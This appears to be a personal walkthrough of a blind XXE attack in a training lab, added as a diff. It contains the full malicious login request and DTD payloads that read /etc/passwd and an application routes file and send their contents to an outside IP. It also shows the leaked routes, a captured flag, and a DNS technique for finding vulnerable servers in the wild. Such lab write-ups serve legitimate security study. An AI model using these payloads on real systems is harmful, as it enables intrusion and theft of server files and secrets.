@@ -1,0 +1,75 @@
+blind xxe injection
+
+use four terminals (since it's a blind attack):
+
+one to send the initial request (step 1).
+one to serve the DTD (step 2&3).
+one to retrieve the information sent by the server (step 5).
+one for debugging purpose.
+
+modify login request to send XML:
+
+remove all the uneeded information to make debugging easier.
+add the XML message in the body of the request.
+change the Content-Type of the request. => text/xml
+
+(*) use http not https
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+POST /login HTTP/1.1
+Host: ptl-0b0ac5a5-a438cdec.libcurl.so
+Content-Type: text/xml
+Connection: close
+Content-Length: 98
+
+<?xml version="1.0"?>
+<!DOCTYPE foo SYSTEM "http://104.154.200.137:3000/test.dtd">
+<foo>&e1;</foo>
+
+=> 400 Bad Request
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+test.dtd
+
+<!ENTITY % p1 SYSTEM "file:///etc/passwd">
+<!ENTITY % p2 "<!ENTITY e1 SYSTEM 'http://104.154.200.137:3000/BLAH?%p1;'>">
+%p2;
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+detecting this kind of bugs in the wild:
+
+in the wild, you can't be sure that the server will be allowed to connect back to you.
+to detect this bug (and if the server resolves external names), you can use dns.
+
+to do so, you just need to setup a dns server and monitor its logs. then you can send the initial request with a xml entity pointing to your domain: http://rand0m123.blah.ptl.io/. if the server is vulnerable to xml entity attacks (and can resolve external dns name), you will see a dns query from the vulnerable server.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+<!ENTITY % p1 SYSTEM "file:///opt/play-2.1.3/xxe/conf/routes">
+<!ENTITY % p2 "<!ENTITY e1 SYSTEM 'http://104.154.200.137:3000/BLAH?%p1;'>">
+%p2;
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+GET     /                           controllers.Application.index()
+GET     /taifai2KooF8ieceshaeZai2             controllers.Application.secret_url()
+GET       /login                   controllers.Application.login
+POST      /login                   controllers.Application.login
+GET       /logout                  controllers.Application.logout
+
+GET     /assets/*file               controllers.Assets.at(path="/public", file)
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+409d4096-8a1c-4cd8-a309-43560084244b
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+
+
+
+
